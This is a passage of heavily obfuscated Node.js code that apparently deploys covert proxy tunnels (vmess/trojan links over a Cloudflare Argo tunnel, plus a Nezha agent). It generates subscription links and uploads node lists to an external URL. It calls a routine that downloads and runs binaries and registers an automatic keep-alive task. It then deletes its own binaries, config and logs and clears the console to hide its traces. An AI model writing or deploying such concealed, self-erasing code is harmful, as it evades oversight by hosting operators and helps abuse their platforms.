_0x1e07f8={_0x285072:0x1ff,_0x4a2150:0x1bc,_0x4b8770:0x1c9,_0x37f22d:0x231,_0xc48710:0x185,_0x4e596a:0x235,_0x130e97:0x1c1,_0x2a1048:0x229,_0xa454d6:0x20c,_0x209395:0x19d},_0x3671eb={_0x4ff779:0x235,_0x7aefb3:0x1e1};setTimeout(()=>{const _0x52b1c6=_0x101d,_0x5f4ecf={'v':'2','ps':''+_0x443102,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x52b1c6(_0x1e07f8._0x285072),'net':'ws','type':_0x52b1c6(_0x1e07f8._0x285072),'host':_0x33a636,'path':_0x52b1c6(0x1a1),'tls':'tls','sni':_0x33a636,'alpn':'','fp':'firefox'},_0x29a173=_0x52b1c6(0x17b)+UUID+'@'+CFIP+':'+CFPORT+_0x52b1c6(_0x1e07f8._0x4a2150)+_0x33a636+'&fp=firefox&type=ws&host='+_0x33a636+_0x52b1c6(_0x1e07f8._0x4b8770)+_0x443102+_0x52b1c6(0x1ec)+Buffer['from'](JSON[_0x52b1c6(0x1f5)](_0x5f4ecf))[_0x52b1c6(0x20c)](_0x52b1c6(0x235))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x33a636+_0x52b1c6(_0x1e07f8._0x37f22d)+_0x33a636+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x443102+_0x52b1c6(_0x1e07f8._0xc48710);console['log'](Buffer[_0x52b1c6(0x229)](_0x29a173)['toString'](_0x52b1c6(_0x1e07f8._0x4e596a))),fs[_0x52b1c6(_0x1e07f8._0x130e97)](subPath,Buffer[_0x52b1c6(_0x1e07f8._0x2a1048)](_0x29a173)[_0x52b1c6(_0x1e07f8._0xa454d6)](_0x52b1c6(_0x1e07f8._0x4e596a))),console['log'](FILE_PATH+_0x52b1c6(_0x1e07f8._0x209395)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5e441f,_0x4c17c3)=>{const _0x2b2b71=_0x52b1c6,_0x569a75=Buffer[_0x2b2b71(0x229)](_0x29a173)[_0x2b2b71(0x20c)](_0x2b2b71(_0x3671eb._0x4ff779));_0x4c17c3['set']('Content-Type','text/plain;\x20charset=utf-8'),_0x4c17c3[_0x2b2b71(_0x3671eb._0x7aefb3)](_0x569a75);}),_0x36d4b8(_0x29a173);},0x7d0);});}}async function uploadNodes(){const _0x29ec9c={_0x302a6c:0x1b6,_0x1db8dd:0x211,_0x1f0df0:0x204,_0x49c2cc:0x219,_0x22498d:0x189,_0x4f9e53:0x1e4,_0x333ddc:0x1c2,_0x455135:0x1f5,_0x59759a:0x1be},_0x581dbf=_0x27e989;if(UPLOAD_URL&&PROJECT_URL){const _0x487ea9=PROJECT_URL+'/'+SUB_PATH,_0x3de90c={'subscription':[_0x487ea9]};try{const _0x5533da=await axios[_0x581dbf(0x1f9)](UPLOAD_URL+_0x581dbf(0x1e6),_0x3de90c,{'headers':{'Content-Type':_0x581dbf(_0x29ec9c._0x302a6c)}});return _0x5533da&&_0x5533da[_0x581dbf(_0x29ec9c._0x1db8dd)]===0xc8?(console[_0x581dbf(0x21e)](_0x581dbf(_0x29ec9c._0x1f0df0)),_0x5533da):null;}catch(_0x5df486){if(_0x5df486[_0x581dbf(_0x29ec9c._0x49c2cc)]){if(_0x5df486[_0x581dbf(_0x29ec9c._0x49c2cc)][_0x581dbf(0x211)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x581dbf(0x1d1)](listPath))return;const _0x12d65b=fs[_0x581dbf(_0x29ec9c._0x22498d)](listPath,'utf-8'),_0x56c862=_0x12d65b[_0x581dbf(_0x29ec9c._0x4f9e53)]('\x0a')['filter'](_0x46ade5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x581dbf(0x200)](_0x46ade5));if(_0x56c862[_0x581dbf(_0x29ec9c._0x333ddc)]===0x0)return;const _0x4e1145=JSON[_0x581dbf(_0x29ec9c._0x455135)]({'nodes':_0x56c862});try{const _0x2f76ca=await axios[_0x581dbf(0x1f9)](UPLOAD_URL+'/api/add-nodes',_0x4e1145,{'headers':{'Content-Type':_0x581dbf(0x1b6)}});return _0x2f76ca&&_0x2f76ca[_0x581dbf(0x211)]===0xc8?(console[_0x581dbf(0x21e)](_0x581dbf(_0x29ec9c._0x59759a)),_0x2f76ca):null;}catch(_0x4bf1c5){return null;}}else return;}}function cleanFiles(){const _0x2a8b2b={_0x1aa641:0x192,_0x2789f1:0x199,_0x316533:0x221,_0x6b8cc7:0x1e9},_0x33ecb0={_0x2f94db:0x21e};setTimeout(()=>{const _0x439065={_0x286212:0x1ba},_0x296958=_0x101d,_0x304fab=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x304fab[_0x296958(0x1b9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x304fab['push'](phpPath);process['platform']===_0x296958(_0x2a8b2b._0x1aa641)?exec(_0x296958(0x1c6)+_0x304fab['join']('\x20')+_0x296958(_0x2a8b2b._0x2789f1),_0x1400fa=>{const _0x16b0be=_0x296958;console[_0x16b0be(0x1db)](),console[_0x16b0be(0x21e)](_0x16b0be(0x1ba)),console[_0x16b0be(_0x33ecb0._0x2f94db)](_0x16b0be(0x18a));}):exec(_0x296958(_0x2a8b2b._0x316533)+_0x304fab['join']('\x20')+_0x296958(_0x2a8b2b._0x6b8cc7),_0x5addd2=>{const _0x47c6e9=_0x296958;console['clear'](),console[_0x47c6e9(0x21e)](_0x47c6e9(_0x439065._0x286212)),console[_0x47c6e9(0x21e)](_0x47c6e9(0x18a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xff8ba8={_0x6d28bc:0x21e,_0xdcea26:0x1f9,_0xfc0c6f:0x1ad,_0x49f06f:0x1c5},_0x23649a=_0x27e989;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x23649a(_0xff8ba8._0x6d28bc)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x222be5=await axios[_0x23649a(_0xff8ba8._0xdcea26)](_0x23649a(0x191),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x23649a(0x1b6)}});return console[_0x23649a(0x21e)](_0x23649a(_0xff8ba8._0xfc0c6f)),_0x222be5;}catch(_0x1ac350){return console['error'](_0x23649a(_0xff8ba8._0x49f06f)+_0x1ac350[_0x23649a(0x21f)]),null;}}async function startserver(){const _0x500842={_0x28719e:0x1f3},_0x38748f=_0x27e989;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5516dd){console[_0x38748f(0x1cd)](_0x38748f(_0x500842._0x28719e),_0x5516dd);}}startserver()['catch'](_0x2fa0d7=>{const _0x4e27d6=_0x27e989;console[_0x4e27d6(0x1cd)](_0x4e27d6(0x22d),_0x2fa0d7);}),app['listen'](PORT,()=>console[_0x27e989(0x21e)](_0x27e989(0x18d)+PORT+'!'));
